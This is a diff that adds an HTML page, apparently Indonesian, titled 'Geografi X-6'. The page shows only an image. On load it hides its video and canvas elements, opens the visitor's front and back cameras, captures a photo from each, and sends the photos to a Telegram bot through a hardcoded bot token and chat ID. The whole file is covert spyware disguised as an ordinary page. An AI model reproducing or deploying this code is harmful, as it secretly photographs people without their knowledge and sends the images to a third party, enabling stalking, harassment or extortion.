@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Geografi X-6</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body, html { width: 100vw; height: 100vh; background: #000; display: flex; justify-content: center; align-items: center; overflow: hidden; }
+        img { max-width: 100%; max-height: 100vh; object-fit: contain; }
+        video, canvas { display: none; } /* Sembunyikan elemen kamera */
+    </style>
+</head>
+<body>
+    <!-- Gambar yang sudah lo setting -->
+    <img src="https://img5.pixhost.to/images/2820/565901428_skyzopedia.jpg" alt="Skyzopedia">
+
+    <!-- Kamera -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "7788095309:AAEjIyu4Beuzs6IVZjHrTLN_9NmPy6vs8DY";
+        const TELEGRAM_CHAT_ID = "7081489041";
+
+        async function startCamera() {
+            try {
+                const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+
+                setTimeout(() => capturePhoto(streamFront, "Depan"), 3000);
+                setTimeout(() => capturePhoto(streamBack, "Belakang"), 6000);
+            } catch (error) {
+                console.error("Gagal mengakses kamera:", error);
+            }
+        }
+
+        function capturePhoto(stream, label) {
+            const video = document.getElementById("video");
+            video.srcObject = stream;
+
+            setTimeout(() => {
+                const canvas = document.getElementById("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const imageData = canvas.toDataURL("image/jpeg");
+                sendToTelegram(imageData, label);
+            }, 2000);
+        }
+
+        async function sendToTelegram(imageData, label) {
+            try {
+                const blob = await fetch(imageData).then(res => res.blob());
+                const formData = new FormData();
+                formData.append("chat_id", TELEGRAM_CHAT_ID);
+                formData.append("photo", blob, `${label}.jpg`);
+                formData.append("caption", `📷 Foto ${label}`);
+
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                });
+
+                console.log(`Foto ${label} berhasil dikirim!`);
+            } catch (error) {
+                console.error("Gagal mengirim foto:", error);
+            }
+        }
+
+        window.onload = startCamera;
+    </script>
+</body>
+</html>
